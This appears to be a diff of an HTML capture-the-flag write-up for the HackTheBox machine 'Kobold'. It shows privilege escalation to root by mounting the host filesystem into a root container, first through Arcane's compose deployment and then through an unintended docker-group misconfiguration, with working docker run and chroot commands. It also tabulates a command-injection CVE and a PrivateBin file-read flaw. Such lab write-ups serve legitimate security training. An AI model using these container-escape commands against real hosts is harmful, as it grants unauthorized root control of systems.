+      <div class="section-num">6</div>
+      <div class="section-title">Privilege Escalation — Arcane Container Deployment → Root</div>
+    </div>
+    <div class="section-body">
+      <p>As an Arcane admin we can deploy new containers through the dashboard. The Docker daemon runs as root, and Arcane has access to the host's Docker socket at <span class="ic">unix:///var/run/docker.sock</span> — visible in the sidebar. Deploying a container with the host filesystem mounted at <span class="ic">/hostfs</span> and running as root gives full access to the host.</p>
+
+      <h3>Step 1 — Create a New Project</h3>
+      <p>Click <strong>Projects</strong> in the left sidebar → <strong>New Project</strong>. Paste the following compose definition and click <strong>Create Project</strong>:</p>
+
+      <pre data-label="docker-compose.yml"><code>services:
+  pwn:
+    image: privatebin/nginx-fpm-alpine:2.0.2
+    user: root
+    entrypoint: [<span class="c-orange">"/bin/sh"</span>, <span class="c-orange">"-c"</span>, <span class="c-orange">"sleep 3600"</span>]
+    volumes:
+      - <span class="c-red">/:/hostfs</span></code></pre>
+
+      <div class="info-box">We use <span class="ic">privatebin/nginx-fpm-alpine:2.0.2</span> because it's already pulled on the host — no outbound internet access needed. The <span class="ic">sleep 3600</span> entrypoint keeps the container alive so we can use the interactive shell.</div>
+
+      <h3>Step 2 — Access the Shell</h3>
+      <p>Once the container is running, navigate to <strong>Containers</strong> → click <strong>pwn-pwn-1</strong> → click the <strong>Shell</strong> tab. Arcane provides an interactive browser-based shell directly into the container:</p>
+
+      <pre data-label="arcane shell"><code>/var/www # id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon)...
+
+/var/www # cat /hostfs/root/root.txt</code></pre>
+
+      <div class="success-box">/var/www # cat /hostfs/root/root.txt<br><span class="cred" onclick="showTroll()">&#128274; REDACTED</span></div>
+    </div>
+  </div>
+
+  <!-- DIVIDER - UNINTENDED -->
+  <hr class="divider"><span class="divider-label unintended">// Unintended Path</span>
+
+  <!-- SECTION 7 - UNINTENDED -->
+  <div class="section" style="border-color:rgba(255,62,62,.3);">
+    <div class="section-header" style="background:rgba(255,62,62,.05);">
+      <div class="section-num red">!</div>
+      <div class="section-title">Unintended: Docker Group Misconfiguration</div>
+      <span class="section-tag unintended">Unintended</span>
+    </div>
+    <div class="section-body">
+      <p>This box has a misconfiguration that allows skipping the entire PrivateBin and Arcane steps. Ben is a member of the <span class="ic">operator</span> group (gid 37), and the Docker socket at <span class="ic">/var/run/docker.sock</span> has group ownership set to <span class="ic">docker</span> with <span class="ic">srw-rw----</span> permissions. The <span class="ic">operator</span> group happens to have access to the docker socket on this host — an unintended misconfiguration by the box creator.</p>
+
+      <div class="danger-box">This was confirmed as unintended by the box creator. The docker group access via the operator group was a configuration mistake — the intended path requires going through PrivateBin and Arcane to reach the privileged container deployment.</div>
+
+      <p>After landing the initial MCP shell as ben, the unintended path is two commands:</p>
+
+      <pre data-label="bash"><code><span class="c-green">ben@kobold:~$</span> id
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+
+<span class="c-dim"># Switch active group to docker (available via operator group membership)</span>
+<span class="c-green">ben@kobold:~$</span> sg docker -c <span class="c-orange">"docker run --rm -v /:/hostfs --user root \
+  --entrypoint /bin/sh privatebin/nginx-fpm-alpine:2.0.2 \
+  -c 'cat /hostfs/root/root.txt'"</span></code></pre>
+
+      <div class="success-box">ben@kobold:~$ sg docker -c "docker run..."<br><span class="cred" onclick="showTroll()">&#128274; REDACTED</span></div>
+
+      <p>Alternatively with <span class="ic">newgrp</span> for an interactive session:</p>
+
+      <pre data-label="bash"><code><span class="c-green">ben@kobold:~$</span> newgrp docker
+<span class="c-green">ben@kobold:~$</span> docker run -it --rm -v /:/hostfs --user root \
+  --entrypoint /bin/sh privatebin/nginx-fpm-alpine:2.0.2 \
+  -c <span class="c-orange">'chroot /hostfs /bin/bash'</span>
+<span class="c-green">root@kobold:/#</span> id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+    </div>
+  </div>
+
+  <!-- CVE Summary -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num blue">i</div>
+      <div class="section-title">Vulnerability Summary</div>
     </div>
     <div class="section-body">
       <table>
-        <tr><th>CVE</th><th>Component</th><th>Affected Version</th><th>Impact</th></tr>
-        <tr><td>CVE-2026-23520</td><td>Arcane MCP Server</td><td>&lt; v1.13.0 (patched)</td><td>Unauthenticated command injection via /api/mcp/connect → RCE as ben</td></tr>
+        <tr><th>ID</th><th>Component</th><th>Version</th><th>Impact</th></tr>
+        <tr><td>CVE-2026-23520</td><td>Arcane MCP Server</td><td>&lt; v1.13.0 patched</td><td>Unauthenticated command injection via /api/mcp/connect → RCE as ben</td></tr>
+        <tr><td>GHSA-g2j9-g8r5-rg82</td><td>PrivateBin template-switching</td><td>&lt; 2.0.3</td><td>Unauthenticated LFI via template cookie → read container config → creds</td></tr>
+        <tr><td>Misconfiguration</td><td>Docker socket permissions</td><td>N/A</td><td>operator group docker socket access → unintended host filesystem mount</td></tr>
       </table>
-      <p>The broader advisory also covers command injection in Arcane's container update lifecycle labels (<span class="ic">com.getarcaneapp.arcane.lifecycle.pre-update</span> / <span class="ic">post-update</span>), which pass Docker label values directly to <span class="ic">/bin/sh -c</span> without sanitisation. The MCP endpoint is the more direct exploitation path — it requires no admin interaction and no pre-existing container to poison.</p>
     </div>
   </div>
 
@@ -253,13 +427,15 @@ uid=0(root) gid=0(root) groups=0(root)</code></pre>
     <div class="troll-title">Really?</div>
     <div class="troll-body">
       The flags are <strong style="color:var(--green)">inside the box</strong> &mdash; not in a writeup.<br><br>
-      Go find them yourself. That&apos;s literally the point. &#128526;
+      Go find them yourself. That's literally the point. &#128526;
     </div>
-    <button class="troll-btn" onclick="document.getElementById('troll-modal').style.display='none'">Fine. I&apos;ll do it myself.</button>
+    <button class="troll-btn" onclick="document.getElementById('troll-modal').style.display='none'">Fine. I'll do it myself.</button>
   </div>
 </div>
 <script>function showTroll(){document.getElementById('troll-modal').style.display='flex';}</script>
 
-<footer>HackTheBox &middot; Kobold &middot; Seasonal S10 &middot; Easy &middot; Linux</footer>
+<footer>
+  HackTheBox &middot; Kobold &middot; Seasonal S10 &middot; Easy &middot; Linux
+</footer>
 </body>
 </html>
